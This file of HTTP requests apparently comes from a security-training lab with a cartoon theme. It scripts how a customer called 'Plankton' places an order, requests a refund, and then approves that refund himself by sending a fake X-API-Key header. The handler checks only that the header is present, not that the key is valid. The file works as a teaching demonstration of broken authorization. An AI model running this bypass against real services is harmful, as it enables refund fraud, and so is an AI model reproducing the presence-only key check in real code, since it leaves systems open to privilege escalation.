# @import ../common/setup.http
@base = {{base_host}}/v203

### Step 1: Plankton places an order and requests a refund
# @name cart
POST {{base}}/cart
Authorization: {{plankton_auth}}

POST {{base}}/cart/{{cart.response.body.cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": "6" }

# @name order
POST {{base}}/cart/{{cart.response.body.cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

tip=1&delivery_address=Chum Bucket

# @name refund_request
POST {{base}}/orders/{{order.response.body.order_id}}/refund
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

amount=26.50

### Exploit: The "Trust Me Bro" Approval
# Plankton authenticates with his valid Customer Cookie (passing the global middleware).
# He adds a FAKE `X-API-Key` header. The handler sees the header and assumes he is a Manager.
# @name exploit
PATCH {{base}}/orders/{{order.response.body.order_id}}/refund/status
Authorization: {{plankton_auth}}
X-API-Key: trust_me_bro
Content-Type: application/x-www-form-urlencoded

status=approved

# Verification: Refund approved! The handler checked for the *presence* of the key, not its validity.
?? status == 200
?? body.status == "approved"
